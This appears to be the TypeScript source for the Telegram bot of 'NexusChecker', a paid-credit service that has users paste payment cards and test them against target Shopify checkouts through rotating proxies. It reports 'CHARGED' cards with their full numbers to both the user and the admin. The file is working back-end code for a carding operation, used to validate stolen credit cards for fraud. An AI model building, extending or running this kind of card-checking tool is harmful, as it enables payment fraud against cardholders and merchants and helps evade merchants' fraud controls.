import { storage } from '../storage';
import { ADMIN_TELEGRAM_ID, WS_EVENTS } from '@shared/schema';
import { broadcastToTelegramId } from './wsManager';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const ADMIN_ID = process.env.TELEGRAM_ADMIN_ID || ADMIN_TELEGRAM_ID;

interface TelegramUpdate {
  update_id: number;
  message?: {
    message_id: number;
    from: {
      id: number;
      is_bot: boolean;
      first_name: string;
      last_name?: string;
      username?: string;
    };
    chat: {
      id: number;
      type: string;
    };
    date: number;
    text?: string;
  };
}

let pollingActive = false;
let lastUpdateId = 0;

export async function handleBotUpdate(update: TelegramUpdate): Promise<void> {
  if (!update.message?.text) return;

  const { text, from, chat } = update.message;
  const senderId = from.id.toString();
  const isAdmin = senderId === ADMIN_ID;

  if (text.startsWith('/start')) {
    const webAppUrl = getWebAppUrl();
    
    await sendMessageWithButton(chat.id, `
<b>Welcome to NexusChecker</b>

A professional card validation tool using Shopify checkout gateway.

<b>How It Works:</b>
1. Open the app using the button below
2. Add your target Shopify sites
3. Configure proxies for rotation
4. Paste cards and start checking
5. 1 credit = 1 card check

<b>Commands:</b>
/balance - Check your credits
/myid - Get your Telegram ID
${isAdmin ? `
<b>Admin Commands:</b>
/credit [id] [amount] - Add/remove credits
/user [id] - View user details
/broadcast [msg] - Send to all users` : ''}
`, 'Open NexusChecker', webAppUrl);
    return;
  }

  if (text.startsWith('/credit') && isAdmin) {
    const parts = text.split(' ');
    if (parts.length < 3) {
      await sendMessage(chat.id, `
<b>Credit Management</b>

Usage: <code>/credit [user_id] [amount]</code>

Examples:
• <code>/credit 123456789 100</code> - Add 100 credits
• <code>/credit 123456789 -50</code> - Remove 50 credits

The user will be notified of the credit change.
      `);
      return;
    }

    const targetUserId = parts[1];
    const amount = parseInt(parts[2]);

    if (isNaN(amount)) {
      await sendMessage(chat.id, 'Invalid amount. Please enter a number.');
      return;
    }

    let targetUser = await storage.getUserByTelegramId(targetUserId);
    if (!targetUser) {
      targetUser = await storage.createUser({
        telegramId: targetUserId,
        username: null,
        firstName: 'User',
        lastName: null,
        credits: 0,
        totalCharged: 0,
        totalRejected: 0,
        isAdmin: false,
      });
    }

    const updatedUser = await storage.updateUserCredits(targetUserId, amount);
    if (updatedUser) {
      await storage.addCreditTransaction(
        targetUser.id,
        amount,
        amount > 0 ? 'admin_add' : 'admin_remove',
        `${amount > 0 ? 'Added' : 'Removed'} by admin`,
        senderId
      );

      broadcastToTelegramId(targetUserId, { 
        type: WS_EVENTS.CREDITS_UPDATE, 
        payload: { credits: updatedUser.credits } 
      });

      await sendMessage(chat.id, `
<b>Credits Updated</b>

User: <code>${targetUserId}</code>
Change: ${amount > 0 ? '+' : ''}${amount}
New Balance: ${updatedUser.credits} credits
      `);

      if (targetUserId !== senderId) {
        await sendMessage(parseInt(targetUserId), `
<b>Credits ${amount > 0 ? 'Added' : 'Removed'}</b>

Amount: ${amount > 0 ? '+' : ''}${amount}
Balance: ${updatedUser.credits} credits
        `);
      }
    } else {
      await sendMessage(chat.id, 'Failed to update credits.');
    }
    return;
  }

  if (text.startsWith('/user') && isAdmin) {
    const parts = text.split(' ');
    if (parts.length < 2) {
      await sendMessage(chat.id, 'Usage: <code>/user [telegram_id]</code>');
      return;
    }

    const targetUserId = parts[1];
    const targetUser = await storage.getUserByTelegramId(targetUserId);
    
    if (!targetUser) {
      await sendMessage(chat.id, `User <code>${targetUserId}</code> not found.`);
      return;
    }

    await sendMessage(chat.id, `
<b>User Details</b>

ID: <code>${targetUser.telegramId}</code>
Name: ${targetUser.firstName || 'N/A'} ${targetUser.lastName || ''}
Username: @${targetUser.username || 'N/A'}
Credits: ${targetUser.credits}
Approved: ${targetUser.totalCharged}
Declined: ${targetUser.totalRejected}
Admin: ${targetUser.isAdmin ? 'Yes' : 'No'}
    `);
    return;
  }

  if (text.startsWith('/broadcast') && isAdmin) {
    const message = text.replace('/broadcast', '').trim();
    if (!message) {
      await sendMessage(chat.id, 'Usage: <code>/broadcast [message]</code>');
      return;
    }
    await sendMessage(chat.id, 'Broadcast feature coming soon.');
    return;
  }

  if (text.startsWith('/myid')) {
    await sendMessage(chat.id, `
<b>Your Telegram ID</b>
<code>${from.id}</code>

Share this with the admin to receive credits.
    `);
    return;
  }

  if (text.startsWith('/balance')) {
    const user = await storage.getUserByTelegramId(senderId);
    if (user) {
      await sendMessage(chat.id, `
<b>Your Balance</b>

Credits: ${user.credits}
Approved: ${user.totalCharged}
Declined: ${user.totalRejected}
      `);
    } else {
      const webAppUrl = getWebAppUrl();
      await sendMessageWithButton(chat.id, 
        'No account found. Open the app to create one.',
        'Open NexusChecker',
        webAppUrl
      );
    }
    return;
  }

  const webAppUrl = getWebAppUrl();
  await sendMessageWithButton(chat.id, 
    'Unknown command. Use /start for help.',
    'Open NexusChecker',
    webAppUrl
  );
}

function getWebAppUrl(): string {
  if (process.env.REPLIT_DEV_DOMAIN) {
    return `https://${process.env.REPLIT_DEV_DOMAIN}`;
  }
  return `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
}

export async function sendChargedCardNotification(
  userTelegramId: string, 
  card: string, 
  siteName: string,
  message: string
): Promise<boolean> {
  if (!BOT_TOKEN) return false;
  
  const cardParts = card.split('|');
  const maskedCard = cardParts[0] 
    ? `${cardParts[0].substring(0, 6)}****${cardParts[0].slice(-4)}` 
    : card.substring(0, 10);
  
  const notificationText = `
<b>CHARGED CARD</b>

<b>Card:</b> <code>${card}</code>
<b>Site:</b> ${siteName}
<b>Response:</b> ${message}

<i>Powered by NexusChecker</i>
  `;
  
  await sendMessage(userTelegramId, notificationText);
  
  if (ADMIN_ID && ADMIN_ID !== userTelegramId) {
    const adminText = `
<b>NEW CHARGE</b>

<b>User:</b> <code>${userTelegramId}</code>
<b>Card:</b> <code>${card}</code>
<b>Site:</b> ${siteName}
<b>Response:</b> ${message}
    `;
    await sendMessage(ADMIN_ID, adminText);
  }
  
  return true;
}

async function sendMessage(chatId: number | string, text: string): Promise<boolean> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text.trim(),
        parse_mode: 'HTML',
      }),
    });
    return response.ok;
  } catch (error) {
    console.error('Error sending message:', error);
    return false;
  }
}

async function sendMessageWithButton(chatId: number | string, text: string, buttonText: string, url: string): Promise<boolean> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text.trim(),
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: buttonText,
                web_app: { url }
              }
            ]
          ]
        }
      }),
    });
    return response.ok;
  } catch (error) {
    console.error('Error sending message with button:', error);
    return false;
  }
}

export async function setWebhook(webhookUrl: string): Promise<boolean> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: webhookUrl }),
    });
    const result = await response.json();
    console.log('Webhook set result:', result);
    return response.ok;
  } catch (error) {
    console.error('Error setting webhook:', error);
    return false;
  }
}

async function deleteWebhook(): Promise<boolean> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
    });
    return response.ok;
  } catch (error) {
    console.error('Error deleting webhook:', error);
    return false;
  }
}

async function getUpdates(): Promise<TelegramUpdate[]> {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`,
      { method: 'GET' }
    );
    const data = await response.json() as { ok: boolean; result?: TelegramUpdate[] };
    if (data.ok && data.result) {
      return data.result;
    }
    return [];
  } catch (error) {
    console.error('Error getting updates:', error);
    return [];
  }
}

export async function startPolling(): Promise<void> {
  if (!BOT_TOKEN) {
    console.log('Telegram bot token not configured, skipping bot startup');
    return;
  }

  if (pollingActive) {
    console.log('Polling already active');
    return;
  }

  console.log('Starting Telegram bot with polling...');
  
  await deleteWebhook();
  
  pollingActive = true;
  
  const poll = async () => {
    while (pollingActive) {
      try {
        const updates = await getUpdates();
        for (const update of updates) {
          lastUpdateId = Math.max(lastUpdateId, update.update_id);
          try {
            await handleBotUpdate(update);
          } catch (e) {
            console.error('Error handling update:', e);
          }
        }
      } catch (e) {
        console.error('Polling error:', e);
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }
  };

  poll().catch(console.error);
  console.log('Telegram bot polling started successfully!');
}

export function stopPolling(): void {
  pollingActive = false;
  console.log('Telegram bot polling stopped');
}
